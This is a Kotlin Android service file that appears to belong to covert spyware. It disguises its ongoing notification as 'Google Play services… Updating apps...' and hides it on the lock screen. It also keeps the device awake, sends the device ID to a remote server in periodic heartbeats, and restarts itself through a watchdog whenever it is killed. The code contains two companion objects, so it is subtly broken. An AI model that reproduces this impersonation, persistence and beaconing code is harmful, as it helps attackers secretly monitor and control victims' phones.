package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.test.utils.UnifiedWatchdogScheduler
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class HeartbeatService : Service() {

    private lateinit var deviceId: String
    
    companion object {
        @Volatile var isRunning = false
    }
    
    private var wakeLock: PowerManager.WakeLock? = null
    private var heartbeatJob: Job? = null
    private var cleanupJob: Job? = null
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, t ->
        Log.e(TAG, "Coroutine error: ${t.message}", t)
    })
    
    companion object {
        private const val TAG = "HeartbeatService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
        
        private const val PREF = "service_alive"
        private const val KEY_LAST_ALIVE = "last_alive_HeartbeatService"
        
        fun markAlive(ctx: Context) {
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                .edit().putLong(KEY_LAST_ALIVE, SystemClock.elapsedRealtime()).apply()
        }
        
        fun lastAlive(ctx: Context): Long =
            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getLong(KEY_LAST_ALIVE, 0L)
    }
    
    private val heartbeatInterval: Long
        get() = ServerConfig.getHeartbeatInterval()

    override fun onCreate() {
        super.onCreate()
        
        com.example.test.utils.DirectBootHelper.logStatus(this)
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        try {
            ServerConfig.initialize(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize ServerConfig: ${e.message}")
        }
        
        acquireWakeLock()
        startForegroundNotification()
        startCleanupLoop()
        startHeartbeat()
    }
    
    private fun startCleanupLoop() {
        cleanupJob = serviceScope.launch {
            while (isActive) {
                delay(10 * 60 * 1000L) // Every 10 minutes
                val rt = Runtime.getRuntime()
                val usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024 / 1024
                if (usedMB > 120) {
                    runCatching { cacheDir.deleteRecursively() }
                }
            }
        }
    }
    
    private fun startHeartbeat() {
        heartbeatJob = serviceScope.launch {
            delay(2000) // Initial delay
            while (isActive) {
                markAlive(applicationContext)
                sendHeartbeat()
                delay(heartbeatInterval)
            }
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock failed: ${e.message}")
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_LOW // 🔹 higher than MIN to keep alive
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // 🔹 not too low
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private suspend fun sendHeartbeat() = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("isOnline", true)
                put("timestamp", System.currentTimeMillis())
                put("source", "HeartbeatService")
            }

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/devices/heartbeat"
            
            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                val bytes = body.toString().toByteArray()
                os.write(bytes)
                os.flush()
            }

            val responseCode = conn.responseCode
            
            if (responseCode in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() }
            }
            
            conn.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat error: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) {
            Log.d(TAG, "Already running, skip duplicate start")
            return START_STICKY
        }
        isRunning = true
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        wakeLock?.release()
        
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        serviceScope.launch {
            cleanup()
            UnifiedWatchdogScheduler.kickNow(applicationContext)
        }
    }
    
    private suspend fun cleanup() = withContext(Dispatchers.IO) {
        cleanupJob?.cancel()
        heartbeatJob?.cancel()
        serviceScope.coroutineContext.cancelChildren()
        Log.d(TAG, "Service cleaned up")
    }
}